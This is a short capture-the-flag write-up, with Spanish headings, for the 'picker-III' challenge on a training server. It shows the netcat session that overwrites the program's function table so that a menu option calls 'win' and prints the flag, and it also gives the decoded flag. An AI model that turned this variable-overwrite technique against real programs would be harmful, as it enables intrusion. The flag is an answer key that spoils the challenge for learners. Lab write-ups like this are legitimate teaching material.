## Descripción
Can you figure out how this program works to get the flag? Connect to the program with netcat:

`$ nc xebec.cylabacademy.net 44958`

The program's source code can be downloaded [here](https://challenge-files.cylabacademy.net/library/0c20c076e50e377ab1ba1e162d33f882ab2caaa6c6766d463bf0af50cdd59d4a/picker-III.py).

Instance

Expires in 14:51

Hints

1

Is there any way to modify the function table?
## Solución
```
Dark23-academy@webshell:~$ wget https://challenge-files.cylabacademy.net/library/0c20c076e50e377ab1ba1e162d33f882ab2caaa6c6766d463bf0af50cdd59d4a/picker-III.py

Dark23-academy@webshell:~$ cat picker-III.py

Dark23-academy@webshell:~$ nc xebec.cylabacademy.net 44958
==> 3
Please enter variable name to write: func_table
Please enter new value of variable: 'print_table'+' '*21+'read_variable'+' '*19+'write_variable'+' '*18+'win'+' '*29
==> 4
0x61 0x63 0x61 0x64 0x65 0x6d 0x79 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x39 0x34 0x38 0x65 0x38 0x36 0x36 0x65 0x7d

academy{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_948e866e}
```
## Notas Adicionales
## Referencias
https://challenge-files.cylabacademy.net/library/0c20c076e50e377ab1ba1e162d33f882ab2caaa6c6766d463bf0af50cdd59d4a/picker-III.py